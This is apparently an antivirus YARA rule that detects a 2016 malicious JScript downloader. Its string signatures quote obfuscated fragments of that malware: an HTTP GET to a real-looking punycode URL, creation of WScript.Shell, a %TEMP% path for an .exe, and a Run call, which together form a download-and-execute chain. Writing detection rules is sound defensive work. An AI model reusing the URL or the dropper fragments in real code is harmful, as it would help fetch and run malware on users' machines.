rule sig_20160401_0a5a030743b5c7c029fdd36d68b8ebd2 {
  meta:
    description = "datamaliciousorder - file 20160401_0a5a030743b5c7c029fdd36d68b8ebd2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "fe1c0cc6d2ab22964b7c20880b23d5ebefa4d828734ead3c5c3e2863c4353ae0"

  strings:
    $s1  = "WyFu[OmoLn](\"G\" + \"ET\", \"http://xn--80ailp.com/q7usja\", false);" fullword ascii
    $s2  = "function RtvUrq(HetYwc, WqtVt){QlQm = QlQm * 1; return HetYwc - WqtVt;};" fullword ascii
    $s3  = "var BocYc = function YpeKhd() {return WScript[UrnVd](\"WScript\"+\".Shell\");}(), RxMs = 11;" fullword ascii
    $s4  = "if (WyFu[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "var PeAn = IoRh[\"getUTCMilliseconds\"]();" fullword ascii
    $s6  = "function LqnCck() {return BocYc[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"7qHk8YJ1SaBNWIy.ex\" + \"e\";};" fullword ascii
    $s7  = "function DyfLrz(){return RplZvy + \"\";};" fullword ascii
    $s8  = "function DuLkd() {return ((MdBm == true) && (MdBm == LrGfw)) ? 1 : QlQm;};" fullword ascii
    $s9  = "var LrGfw = false;" fullword ascii
    $s10 = "}while (OnWha);" fullword ascii
    $s11 = "var MdBm = false;" fullword ascii
    $s12 = "function FrfIdl()" fullword ascii
    $s13 = "function TiqYx(){return UrnVd;};" fullword ascii
    $s14 = "function CeNn(){return 23;};" fullword ascii
    $s15 = "var IoRh = new this[\"Date\"]();" fullword ascii
    $s16 = "var ZkaLr = false;" fullword ascii
    $s17 = "function SmAzw(WudFqz){BocYc[\"R\"+\"un\"](WudFqz, QlQm, QlQm);};" fullword ascii
    $s18 = "ByMq = RtvUrq(PeAn, YyDdt);" fullword ascii
    $s19 = "LrGfw = true; " fullword ascii
    $s20 = "function JypHfo(ScUi) {var MouVej = (1, 2, 3, 4, 5, ScUi); return MouVej;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}